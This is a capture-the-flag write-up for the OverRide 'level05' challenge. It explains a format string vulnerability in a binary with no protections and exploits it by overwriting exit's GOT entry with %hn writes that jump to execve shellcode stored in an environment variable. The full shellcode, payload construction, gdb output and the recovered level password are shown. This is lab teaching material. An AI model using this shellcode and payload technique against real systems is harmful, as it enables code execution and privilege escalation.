# level05

### First analysis

So for this level we have this result for the checksec:

```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

No security at all, not even a Partial RELRO, no canary, no NX, no PIE. This should be pretty easy to exploit.

```c
int main(void) {
    char    buffer[100];
    int     len;

    fgets(buffer, 100, stdin);
    len = strlen(buffer);
    for (int i = 0; i < len; i++) {
        if (buffer[i] >= 'A' && buffer[i] <= 'Z')
            buffer[i] ^= 0x20;
    }
    printf(buffer);

    exit(0);
}
```

For the code part this is again very straightforward, they ask a user input of 100 chars into a fgets, secured. Then a toLower kind of function, that check if there is a caps lock character (between 65 and 90 in hex code) a XOR operation will be made to pass it to lower case.

As we can see pretty easily there is a format string vulnerability as well taht we can easily verify:

```sh
level05@OverRide:~$ ./level05 
%x %x %x %x %x %x
64 f7fcfac0 f7ec3add ffffd4df ffffd4de 0
```

Also important information, exit is used to leave the program, not just a return.

### Solution

We already faced a similar situation [here](https://github.com/kbarbry/RainFall/blob/d5080293ad31339b5e9f40608ac28f02c087d5a4/level4/README.md) which is actually very very close. We know that RELRO is not secured, so the GOT (Global Offset Table) is not in read-only, and we can overwrite it. How ? With the the format string vulnerability we can use the "%n" flag, that will write the numbers of characters written so far into the address indicated. For example:

```c
printf("Hello World!%n", &addr);
```

This line would write 12 at addr. With this method we can write arbitrary values in a specific address. But how can we select the right address ?

If we want to exploit the GOT, we have to overwrite the address of exit, so let's first find this address:

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	push   %edi
   [...]
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) disas 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```

So the address of exit is "0x08048376", but we don't pay attention about this value the interesting one is where is stored exit address in the GOT, which is "0x80497e0". So this is where we have to write something, what ? Well can be anything but we are going to use the env variable with a shellcode in it, so let's do the basic with the env_address.c that you can find in the Resources folder. Let's not forget to compile it in 32bit mode:

```sh
level05@OverRide:/tmp$ export SHELLCODE=$(python -c "print('\x90' * 50 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
level05@OverRide:/tmp$ gcc -m32 env_address.c
level05@OverRide:/tmp$ ./a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xffffd8cf
Lil-endian format: \xcf\xd8\xff\xff
```

So we now have everything, we have to write 0xffffd8cf, the shellcode address, at 0x80497e0, the GOT address that contains the exit address. Now to build the buffer we are going to use a optimized way that we explained in details on how to build [here](https://github.com/kbarbry/RainFall/blob/d5080293ad31339b5e9f40608ac28f02c087d5a4/level4/Resources/explanation.md).

We are going to explain very fast here how we do it with not a lot of explanations. So first we want to write in 0x80497e0 address and 0x80497e0 + 2, so we can use %hn, that store half a 32bit address long, so 16bit. we write half the bytes in 0x80497e0, then half of the other bytes in 0x80497e0 + 2. This way we optimize the number of character to write by 99% (really). So first the two addresses in little endian:

- 0x80497e0 = \xe0\x97\x04\x08
- 0x80497e2 = \xe2\x97\x04\x08

We now have to write 0xffffd8cf into these 2 addresses, let's divide the content into two parts of 16bit:

- ffff - high order bytes - 65535
- d8cf - low order bytes - 55503

That's where we see that the optimization is interesting, writing 121.038 chars (65535 + 55503) is more efficient than writing 4.294.957.263 chars (0xffffd8cf in decimal), a good optimization of 99.993%.

Now where to write all of this ? Well by analyzing the stack:

```sh
level05@OverRide:~$ ./level05 
AAAA %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3add ffffd6af ffffd6ae 0 ffffffff ffffd734 f7fdb000 61616161
```

As we can see the buffer is stored after 10 stack memory slots. We can now make a first version of our payload:

```
'\xe2\x97\x04\x08' + '\xe0\x97\x04\x08' + '%8x' * 10 + '%hn' + '%hn'
```

When testing this first payload:

```sh
(gdb) run < /tmp/payload
Starting program: /home/users/level05/level05 < /tmp/payload
�      64f7fcfac0f7ec3addffffd67fffffd67e       0ffffffffffffd704       0

Program received signal SIGSEGV, Segmentation fault.
0x00500050 in ?? ()
```

So we have indeed a a segfault to a weird address that seemingly wrote 0x50, so 80 in decimal into both addresses, which correspond to the number of char we wrote (8 bits of addresses, and 9 * 8 stack memory space printed so 72). Now we just have to add to that the right values, 65535 first, then 55503. Problem, the first value is higher than the second one so we have to reverse it, we are gonna reverse both addresses, and start with 55503, and end with 10032 (65535 - 55503 already printed):

```
'\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%8x' * 8 + '%55431x' + '%hn' + '%10032x' + '%hn'
```

The payload is almost done, let's not forget that '%x' consume an argument, so a memory space so by writing the last '%x' we are actually printing the second address, to avoid that we just write a random value in between the address and we get:

```
'\xe0\x97\x04\x08' + 'AAAA' + '\xe2\x97\x04\x08' + '%8x' * 8 + '%55427x' + '%hn' + '%10032x' + '%hn'
```

As a final explanation we used in this payload, first the address of the lower bytes, then 4 A that we use as a useless argument that will be used by a padding %x, then the address of the hifhrt bytes, then we print 8 space memory, and one more with a padding of 55427 (55503 - 8 * 8 for the %8x, and - 12 for the 2 addresses and the AAAA), then we use the first %hn that will print 55503 into 0x80497e0, then we use a new %x padding, the one that uses the AAAA argument with a padding of 10032 (65535 - 55503) and the final %hn that will print 65535 into 0x80497e2. We can try it:

```sh
level05@OverRide:~$ echo $(python -c "print('\xe0\x97\x04\x08' + 'AAAA' + '\xe2\x97\x04\x08' + '%8x' * 8 + '%55427x' + '%hn' + '%10032x' + '%hn')") > /tmp/payload
level05@OverRide:~$ cat /tmp/payload - | ./level05 
�aaaa      64f7fcfac0f7ec3addffffd6afffffd6ae       0ffffffffffffd734
[...]
    f7fdb000
[...]
    61616161
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## Important doc

[Similar exercise](https://github.com/kbarbry/RainFall/blob/d5080293ad31339b5e9f40608ac28f02c087d5a4/level4/README.md)
